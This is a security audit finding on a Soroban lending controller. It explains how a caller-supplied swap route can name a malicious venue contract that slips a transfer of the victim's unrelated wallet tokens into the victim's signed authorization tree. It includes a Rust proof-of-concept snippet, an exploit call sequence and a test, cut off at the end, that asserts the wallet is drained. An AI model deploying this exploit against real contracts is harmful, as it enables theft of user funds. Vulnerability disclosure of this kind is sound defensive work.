### Title
Malicious swap-route venue can inject a wallet-token transfer into the caller's signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary

Controller strategy entrypoints accept caller-supplied `StrategySwap` bytes and execute them through the configured router. The router allows route-specified venue/pool addresses, so a malicious venue contract can execute an unrelated `token.transfer(victim, attacker, amount)` while the victim's authorization is active. Soroban simulation records that transfer as a child of the victim's signed controller invocation; if the victim signs the returned tree, the malicious transfer executes and unrelated wallet funds are stolen. The controller's exact controller-held input authorization, measured output check, and final account-risk checks do not bound this additional caller-authorized transfer.

### Finding Description

`swap_collateral(caller, account_id, current, amount, new, swap)` verifies that `caller` owns or delegates the account, then passes the caller-controlled `swap` bytes into `withdraw_and_swap_from_supply`. [1](#0-0) 

`swap_tokens` treats `swap` as opaque router input, authorizes only `token_in.transfer(controller, router, amount_in)` as the controller, and invokes `router.execute_strategy(controller, amount_in, swap)`. [2](#0-1) 

The router decodes each swap instruction's pool address from the caller-controlled `assets` registry and dispatches it as a venue hop; there is no venue/pool allowlist in this path. [3](#0-2) 

Consequently, the named venue contract runs inside the transaction beneath the caller's controller authorization. A malicious venue can call an unrelated token's `transfer` with `from = victim`; simulation attaches that invocation to the victim's signed authorization tree. [4](#0-3) 

The controller's post-call validation only detects excessive spending or missing output for the two strategy tokens; it cannot distinguish or reject an unrelated child authorization that the victim signed. [5](#0-4) 

### Impact Explanation

An attacker can steal arbitrary token balances held directly by the victim, including assets never supplied to or listed by XOXNO Lending. The malicious route can still return economically valid output, so the account finalizes successfully and the theft appears as an unrelated wallet transfer rather than a failed strategy. This is theft of user funds.

### Likelihood Explanation

The attack requires the victim to submit an attacker-influenced `swap` payload and sign the authorization tree produced by simulation. Attackers can deliver such payloads through malicious quote services, phishing frontends, copied route bytes, or compromised integrations. The test demonstrates that the poisoned tree authorizes the transfer and empties the victim's unrelated wallet-token balance while delivering the expected strategy output. [6](#0-5) 

### Recommendation

Do not allow route payloads to name arbitrary executable venue contracts. Maintain an on-chain, governance-approved allowlist of concrete pool/venue addresses compatible with each `SwapVenue`, and reject any route whose `pool` is not approved. Additionally, require integrators and wallet tooling to reject controller authorization trees containing any caller child invocation; an honest controller strategy should not require a nested transfer from the end user because the controller authorizes its own input transfer.

### Proof of Concept

1. Deploy a malicious contract exposing the expected venue swap method. Configure it with `(victim, unrelated_wallet_token, attacker, victim_balance)` and have it perform a plausible swap plus:

```rust
token::Client::new(&env, &unrelated_wallet_token)
    .transfer(&victim, &attacker, &victim_balance);
```

2. Build a `StrategySwap` whose `assets` registry names the malicious contract as a route `pool`.
3. Have the victim call:

```text
swap_collateral(
    caller = victim,
    account_id = victim_account,
    current = USDC_market,
    amount = collateral_amount,
    new = ETH_market,
    swap = malicious_route
)
```

4. Simulate the transaction. Soroban records `unrelated_wallet_token.transfer(victim, attacker, victim_balance)` as a child invocation under the victim's `swap_collateral` authorization. [7](#0-6) 
5. If the victim signs that returned tree, the controller strategy completes with positive measured output and the malicious venue transfers the victim's entire unrelated token balance to the attacker. [8](#0-7)

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
